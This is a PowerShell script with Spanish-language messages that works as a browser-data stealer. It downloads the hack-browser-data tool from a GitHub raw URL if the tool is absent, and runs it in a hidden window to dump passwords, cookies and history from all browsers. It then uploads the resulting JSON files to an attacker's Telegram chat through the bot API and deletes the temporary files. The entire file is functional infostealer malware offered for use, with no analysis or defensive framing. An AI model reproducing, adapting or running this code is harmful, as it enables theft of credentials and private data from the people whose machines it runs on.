param(
    [Parameter(Mandatory = $true)]
    [string]$Token,

    [Parameter(Mandatory = $true)]
    [string]$ChatId,

    [Parameter(Mandatory = $true)]
    [string]$StatePath
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

$Script:ApiUrl = 'https://api.telegram.org/bot' + $Token
$Script:LogPath = Join-Path $env:APPDATA 'CarpetaDos\steal_worker.log'
$null = New-Item -ItemType Directory -Path (Split-Path $Script:LogPath) -Force -ErrorAction SilentlyContinue

function Write-Log {
    param([string]$Message)
    try {
        $stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -Path $Script:LogPath -Value "[$stamp] $Message" -ErrorAction Stop
    }
    catch {
    }
}

function Get-ErrorText {
    param($Exception)
    if ($null -eq $Exception) { return 'Unknown error' }
    if ($Exception.Message) { return $Exception.Message }
    return $Exception.ToString()
}

function Guardar-EstadoSteal {
    param([bool]$Exito)

    $estado = [ordered]@{
        ultimaEjecucion = (Get-Date).ToString('o')
        ultimaEjecucionExito = if ($Exito) { (Get-Date).ToString('o') } else { $null }
        ultimoResultado = $Exito
        ultimaMarca = (Get-Date).ToString('o')
    }

    try {
        $null = New-Item -ItemType Directory -Path (Split-Path $StatePath) -Force -ErrorAction SilentlyContinue
        $estado | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $StatePath -Encoding UTF8 -ErrorAction Stop
    }
    catch {
        Write-Log ('No se pudo guardar el estado de steal: ' + (Get-ErrorText $_.Exception))
    }
}

function Enviar-Mensaje {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [Parameter(Mandatory = $true)] [string]$texto
    )

    try {
        if ([string]::IsNullOrWhiteSpace($texto)) { return $false }
        $body = @{ chat_id = $chatId; text = $texto; parse_mode = 'Markdown' } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri ($Script:ApiUrl + '/sendMessage') -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        Write-Log ('Error enviando mensaje: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Enviar-DocumentoRaw {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [Parameter(Mandatory = $true)] [string]$rutaArchivo,
        [string]$caption = $null
    )

    try {
        if (-not (Test-Path -LiteralPath $rutaArchivo)) {
            Write-Log ('Archivo no existe: ' + $rutaArchivo)
            return $false
        }

        $file = Get-Item -LiteralPath $rutaArchivo
        $uri = $Script:ApiUrl + '/sendDocument'
        $fileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
        $enc = [System.Text.Encoding]::GetEncoding('ISO-8859-1')
        $fileContent = $enc.GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = @(
            '--' + $boundary,
            'Content-Disposition: form-data; name="chat_id"',
            '',
            $chatId,
            '--' + $boundary,
            'Content-Disposition: form-data; name="document"; filename="' + $file.Name + '"',
            'Content-Type: application/octet-stream',
            '',
            $fileContent
        )

        if (-not [string]::IsNullOrWhiteSpace($caption)) {
            $bodyLines += @(
                '--' + $boundary,
                'Content-Disposition: form-data; name="caption"',
                '',
                $caption
            )
        }

        $bodyLines += ('--' + $boundary + '--')
        $body = $bodyLines -join "`r`n"

        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body -ErrorAction Stop
        Write-Log ('Enviado: ' + $file.Name + ' - OK: ' + $response.ok)
        return $true
    }
    catch {
        Write-Log ('Error enviando doc raw: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Obtener-HackBrowserDataPath {
    $candidatos = @()
    $destDir = Join-Path $env:APPDATA 'CarpetaDos'
    $candidatos += (Join-Path $destDir 'hackbrowserdata.exe')
    $candidatos += (Join-Path $destDir 'hack-browser-data.exe')
    $candidatos += (Join-Path (Get-Location).Path 'hackbrowserdata.exe')
    $candidatos += (Join-Path (Get-Location).Path 'hack-browser-data.exe')

    foreach ($ruta in $candidatos) {
        if (-not [string]::IsNullOrWhiteSpace($ruta) -and (Test-Path -LiteralPath $ruta)) {
            return $ruta
        }
    }

    $fallbackUrl = 'https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/hack-browser-data.exe'
    $fallbackPath = Join-Path $destDir 'hackbrowserdata.exe'

    try {
        $null = New-Item -ItemType Directory -Path $destDir -Force -ErrorAction SilentlyContinue
        Invoke-WebRequest -Uri $fallbackUrl -OutFile $fallbackPath -TimeoutSec 120 -UseBasicParsing | Out-Null
        if (Test-Path -LiteralPath $fallbackPath) {
            return $fallbackPath
        }
    }
    catch {
        Write-Log ('No se pudo descargar HackBrowserData: ' + (Get-ErrorText $_.Exception))
    }

    return $null
}

function Ejecutar-HackBrowserData {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId
    )

    try {
        $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
        $tempDir = Join-Path $env:TEMP ('BrowserData_' + $timestamp)
        $null = New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction SilentlyContinue

        $hackBrowserPath = Obtener-HackBrowserDataPath
        if ([string]::IsNullOrWhiteSpace($hackBrowserPath)) {
            Enviar-Mensaje -chatId $chatId -texto 'Error: No se encontro hackbrowserdata.exe ni pudo descargarse.'
            Guardar-EstadoSteal -Exito $false
            return $false
        }

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $hackBrowserPath
        $psi.Arguments = 'dump -b all -c all -f json -d "' + $tempDir + '"'
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true

        $process = [System.Diagnostics.Process]::Start($psi)
        $process.WaitForExit()

        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        Write-Log ('HackBrowserData stdout: ' + $stdout)
        Write-Log ('HackBrowserData stderr: ' + $stderr)
        Write-Log ('Exit code: ' + $process.ExitCode)

        if ($process.ExitCode -ne 0) {
            Enviar-Mensaje -chatId $chatId -texto ('Error ejecutando HackBrowserData: ' + $stderr.Trim())
            Guardar-EstadoSteal -Exito $false
            Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            return $false
        }

        $arquivosJSON = Get-ChildItem -Path $tempDir -Filter '*.json' -Recurse -ErrorAction SilentlyContinue
        if ($null -eq $arquivosJSON -or $arquivosJSON.Count -eq 0) {
            Enviar-Mensaje -chatId $chatId -texto 'No se generaron archivos JSON. Verifica que los navegadores esten instalados.'
            Guardar-EstadoSteal -Exito $false
            Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            return $false
        }

        $enviados = 0
        foreach ($archivo in $arquivosJSON) {
            $nombreConTimestamp = $archivo.BaseName + '_' + $timestamp + '.json'
            $rutaRenombrado = Join-Path $archivo.DirectoryName $nombreConTimestamp
            Rename-Item -LiteralPath $archivo.FullName -NewName $nombreConTimestamp -Force

            $caption = '[' + $archivo.Name + '] - ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
            if (Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $rutaRenombrado -caption $caption) {
                $enviados++
            }

            Start-Sleep -Milliseconds 300
        }

        Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue

        $exito = ($enviados -gt 0)
        if ($exito) {
            $mensaje = 'Extraccion completada. Archivos enviados: ' + [string]$enviados
            Enviar-Mensaje -chatId $chatId -texto $mensaje
        }
        else {
            Enviar-Mensaje -chatId $chatId -texto 'La extracción terminó, pero no se pudo enviar ningún archivo.'
        }

        Guardar-EstadoSteal -Exito $exito
        return $exito
    }
    catch {
        $msg = 'Error en la extracción: ' + (Get-ErrorText $_.Exception)
        Write-Log $msg
        Enviar-Mensaje -chatId $chatId -texto $msg
        Guardar-EstadoSteal -Exito $false
        return $false
    }
}

try {
    Ejecutar-HackBrowserData -chatId $ChatId
    exit 0
}
catch {
    $msg = 'Fallo global del worker: ' + (Get-ErrorText $_.Exception)
    Write-Log $msg
    try {
        Enviar-Mensaje -chatId $ChatId -texto $msg
    }
    catch {
    }
    exit 1
}
